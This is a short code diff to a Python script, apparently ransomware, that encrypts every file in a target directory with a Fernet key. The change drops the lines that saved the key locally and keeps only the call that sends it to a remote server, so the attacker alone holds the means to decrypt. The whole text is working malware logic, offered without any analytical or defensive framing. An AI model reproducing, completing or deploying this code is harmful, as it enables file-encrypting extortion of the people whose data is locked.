@@ -6,12 +6,8 @@ import os
 
 def generar_key():
     key = Fernet.generate_key()
-    with open('prueba/key.key', 'wb') as key_file:
-        key_file.write(key)
-        server.sendToServer(key)
-
-def cargar_key():
-    return open('prueba/key.key', 'rb').read()
+    server.sendToServer(key)
+    return key
 
 def encrypt(items, key):
     f = Fernet(key)
@@ -28,7 +24,6 @@ def cifrar():
     items = os.listdir(path_to_encrypt)
     full_path = [path_to_encrypt+'\\'+item for item in items]
 
-    generar_key()
-    key = cargar_key()
+    key = generar_key()
 
     encrypt(full_path, key)
